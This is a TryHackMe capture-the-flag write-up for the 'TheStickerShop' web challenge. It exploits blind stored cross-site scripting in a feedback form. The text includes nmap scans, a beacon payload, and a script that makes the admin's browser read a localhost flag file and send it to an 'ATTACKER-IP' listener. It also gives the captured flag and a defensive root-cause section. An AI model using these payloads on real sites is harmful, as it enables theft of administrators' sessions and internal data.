# TryHackMe – TheStickerShop Writeup

## Scenario

Today we are solving another easy-rated TryHackMe machine called **TheStickerShop**.

The challenge focuses on identifying a client-side vulnerability within a web application and leveraging it to retrieve sensitive information. The machine presents a realistic scenario where a small business hosts both its website and administrative browsing environment on the same server.

The challenge description provides an important clue:

> They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback.

This hint suggests that customer feedback submitted through the website is likely viewed by an administrator using a browser running on the same machine, making Cross-Site Scripting (XSS) a likely attack vector.

---

# Enumeration

## Target Information

```text
Main IP :: 10.49.134.75
```

---

## Port Scan

Initial Nmap scan:

```bash
nmap -Pn 10.49.134.75
```

Results:

```text
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Only SSH and a web application are exposed.

---

## Service Enumeration

Running version detection:

```bash
nmap -sC -sV -Pn 10.49.134.75
```

Results:

```text
22/tcp open ssh OpenSSH 8.2p1 Ubuntu
8080/tcp open http Werkzeug/3.0.1 Python/3.8.10
```

Important observations:

```text
Werkzeug 3.0.1
Python 3.8.10
```

The web application title is:

```text
Cat Sticker Shop
```

---

# Web Application Analysis

Browsing to the website reveals a simple sticker shop application.

The site contains a feedback functionality where users can submit comments or suggestions.

Since there are very few visible attack surfaces, the feedback feature becomes the primary target.

---

# Initial Testing

Basic payloads were tested:

```html
<script>alert(1)</script>
```

No visible execution occurred.

Since the application appears to store feedback for later review, a blind XSS approach becomes more appropriate.

---

# Blind XSS Testing

A payload was submitted to determine whether an administrator views feedback entries:

```html
'"><script src=https://BURP-COLLABORATOR></script>
```

Using Interactsh:

```bash
interactsh-client
```

After submission, DNS interactions were received:

```text
Received DNS interaction
Received DNS interaction
```

This confirms:

* Input is stored.
* An administrator reviews submissions.
* JavaScript executes within the administrator's browser.

This is a successful Blind XSS vulnerability.

---

# Understanding the Scenario

The challenge description indicates:

```text
The website and the administrator's browsing environment
are hosted on the same machine.
```

This means the administrator browser has access to resources that external users cannot access.

The objective becomes:

```text
Use XSS to force the administrator browser
to retrieve local resources.
```

---

# Identifying the Target

A common challenge pattern involves sensitive files exposed only locally.

The likely target:

```text
http://127.0.0.1:8080/flag.txt
```

The administrator's browser can access localhost resources because it runs on the same host.

---

# Crafting the Payload

A malicious JavaScript payload was submitted through the feedback form:

```html
'"><script>
fetch('http://127.0.0.1:8080/flag.txt')
.then(response => response.text())
.then(data => {
fetch('http://ATTACKER-IP:8000/?flag=' + encodeURIComponent(data));
});
</script>
```

---

## Payload Breakdown

### Step 1

Request the internal file:

```javascript
fetch('http://127.0.0.1:8080/flag.txt')
```

Because the administrator browser runs locally, it can access the file.

---

### Step 2

Read the file contents:

```javascript
response.text()
```

---

### Step 3

Exfiltrate the contents:

```javascript
fetch('http://ATTACKER-IP:8000/?flag=' + encodeURIComponent(data))
```

This sends the retrieved flag to our machine.

---

# Setting Up Listener

A simple HTTP server was started:

```bash
python3 -m http.server 8000
```

Waiting for the administrator to review the feedback.

---

# Successful Exfiltration

After the administrator viewed the stored feedback entry:

```text
10.49.134.75 - - [20/Jun/2026 03:09:10]
GET /?flag=THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

The flag was successfully retrieved.

---

# Flag

```text
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

---

# Vulnerability Analysis

## Root Cause

The application failed to sanitize user-supplied feedback before displaying it to administrators.

User-controlled HTML and JavaScript were rendered directly in the administrator's browser.

---

## Attack Chain

```text
User submits malicious feedback
            ↓
Feedback stored by application
            ↓
Administrator reviews feedback
            ↓
JavaScript executes
            ↓
Browser accesses localhost resource
            ↓
Flag retrieved
            ↓
Data exfiltrated to attacker
```

---

# Security Impact

A real-world attacker could use this vulnerability to:

* Steal session cookies
* Perform actions as an administrator
* Access internal-only applications
* Read localhost services
* Pivot into internal infrastructure
* Extract sensitive files

Because the administrator browser and application server are hosted together, the impact becomes significantly greater than a traditional XSS vulnerability.

---

# MITRE ATT&CK Mapping

### T1059.007

```text
JavaScript
```

Execution of attacker-controlled JavaScript.

---

### T1185

```text
Browser Session Hijacking
```

Potential theft of administrative sessions.

---

### T1213

```text
Data from Information Repositories
```

Reading sensitive local files through the administrator browser.

---

### T1041

```text
Exfiltration Over Web Service
```

Sending the flag to an attacker-controlled server.

---

# Conclusion

TheStickerShop demonstrates a classic **Blind Stored Cross-Site Scripting (XSS)** vulnerability. By injecting malicious JavaScript into the feedback system, it was possible to execute code within the administrator's browser when the feedback was reviewed. Because the administrator browsed the site from the same machine hosting the application, the injected script could access localhost resources that external users could not reach. Using JavaScript's Fetch API, the internal file **flag.txt** was retrieved from the local machine and exfiltrated to an attacker-controlled server, resulting in successful compromise of the challenge.
